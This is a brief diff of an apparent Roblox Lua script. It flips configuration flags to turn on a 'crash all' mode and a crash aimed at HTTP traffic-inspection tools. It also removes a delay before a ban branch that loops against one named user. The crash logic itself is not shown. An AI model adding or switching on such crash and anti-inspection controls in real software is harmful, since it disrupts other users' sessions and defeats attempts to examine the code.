@@ -1,12 +1,12 @@
 local players = game.Players
 local lplr = players.LocalPlayer
 local name = lplr.Name
-local delay = 1
+local delay = 10
 -----------------------------
 local KickBlacklistedUsersEnabled = false
 local BanBlacklistedUsersEnabled = true
-local CrashBlacklistedUsersEnabled = true
-local CrashAllIsActive = false
+local CrashBlacklistedUsersEnabled = false
+local CrashAllIsActive = true
 local ScriptIsDisabled = false
 local CrashHttpSpy = true
 -----------------------------
@@ -18,7 +18,6 @@ if KickBlacklistedUsersEnabled then
 end
 -----------------------------
 if BanBlacklistedUsersEnabled then 
-   task.wait(delay)
     if name == "Iightnz" then
       while true do 
          task.wait(0.5)
